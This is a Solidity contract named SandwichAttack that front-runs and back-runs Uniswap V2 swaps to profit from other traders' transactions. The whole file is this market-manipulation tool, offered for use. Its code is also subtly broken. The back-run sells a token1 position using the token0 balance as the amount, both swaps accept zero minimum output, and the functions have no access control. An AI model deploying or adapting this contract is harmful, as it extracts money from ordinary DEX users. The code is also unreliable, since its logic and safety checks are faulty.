// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}
contract SandwichAttack {
    address private constant uniswapV2RouterAddress =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IERC20 public token0 ; // token0
    IERC20 public token1 ; // token1
    uint256 public maxValue = 2**256 - 1;

    function frontrun(address _token0, address _token1, uint256 amount) external {
        token0 = IERC20(_token0);
        token1 = IERC20(_token1);
        require(getBalance(_token0) > amount,"lower balance");
        IERC20(_token0).approve(uniswapV2RouterAddress, maxValue);
        IERC20(_token1).approve(uniswapV2RouterAddress, maxValue);
        address[] memory path = new address[](2);
        path[0] = _token0;
        path[1] = _token1;
               // Set the minimum amount of tokenOut that must be received
        uint amountOutMin = 0;

        // Set the deadline for the token swap
        uint deadline = block.timestamp + 300; // 5 minute deadline

        // Swap the tokens on UniswapV2
        uint[] memory amounts = IUniswapV2Router02(uniswapV2RouterAddress)
            .swapExactTokensForTokens(
                amount,
                amountOutMin,
                path,
                address(this),
                deadline
            );
    }

    function backrun() external {
        address[] memory path = new address[](2);
        path[0] = address(token1);
        path[1] = address(token0);
        uint256 amount = token0.balanceOf(address(this));
        uint[] memory amounts = IUniswapV2Router02(uniswapV2RouterAddress).swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp + 300);
    }

    function getBalance(address _token)public view returns(uint256 result) {
        return IERC20(_token).balanceOf(address(this));
    }
}